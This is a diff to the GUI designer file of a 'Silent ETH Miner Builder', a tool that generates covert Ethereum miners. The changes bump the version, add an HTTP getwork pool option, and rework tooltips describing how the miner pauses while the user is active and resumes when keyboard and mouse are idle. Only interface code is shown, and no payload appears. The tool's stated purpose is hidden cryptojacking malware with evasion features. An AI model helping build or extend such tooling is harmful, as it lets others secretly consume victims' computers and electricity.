@@ -153,7 +153,7 @@ Partial Class Form1
         Me.MephForm1.Size = New System.Drawing.Size(535, 272)
         Me.MephForm1.SubHeader = "By Unam Sanctam, Credit to NYAN-x-CAT"
         Me.MephForm1.TabIndex = 0
-        Me.MephForm1.Text = "Silent ETH Miner Builder 1.0"
+        Me.MephForm1.Text = "Silent ETH Miner Builder 1.0.1"
         '
         'MephTabcontrol2
         '
@@ -430,7 +430,7 @@ Partial Class Form1
         Me.txtPoolScheme.FormattingEnabled = True
         Me.txtPoolScheme.ItemHeight = 16
         Me.txtPoolScheme.ItemHighlightColor = System.Drawing.Color.FromArgb(CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(55, Byte), Integer))
-        Me.txtPoolScheme.Items.AddRange(New Object() {"stratum (Standard)", "stratums (SSL/TLS)", "stratumss (SSL/TLS 1.2)"})
+        Me.txtPoolScheme.Items.AddRange(New Object() {"stratum (Standard)", "stratums (SSL/TLS)", "stratumss (SSL/TLS 1.2)", "http (getwork, proxy)"})
         Me.txtPoolScheme.Location = New System.Drawing.Point(8, 56)
         Me.txtPoolScheme.Margin = New System.Windows.Forms.Padding(2)
         Me.txtPoolScheme.Name = "txtPoolScheme"
@@ -1055,8 +1055,7 @@ Partial Class Form1
         Me.Label25.Size = New System.Drawing.Size(13, 13)
         Me.Label25.TabIndex = 54
         Me.Label25.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label25, "If enabled the miner will pause when the computer is active and resume when no ke" &
-        "yboard and mouse input has been detected for the ""Idle Wait"" amount of minutes.")
+        Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of minutes to wait before starting Idle mode.")
         '
         'Label24
         '
@@ -1161,7 +1160,8 @@ Partial Class Form1
         Me.Label15.Size = New System.Drawing.Size(13, 13)
         Me.Label15.TabIndex = 39
         Me.Label15.Text = "?"
-        Me.TooltipHelper.SetToolTip(Me.Label15, resources.GetString("Label15.ToolTip"))
+        Me.TooltipHelper.SetToolTip(Me.Label15, "If enabled the miner will pause when the computer is active and resume when no ke" &
+        "yboard and mouse input has been detected for the ""Idle Wait"" amount of minutes.")
         '
         'Label11
         '
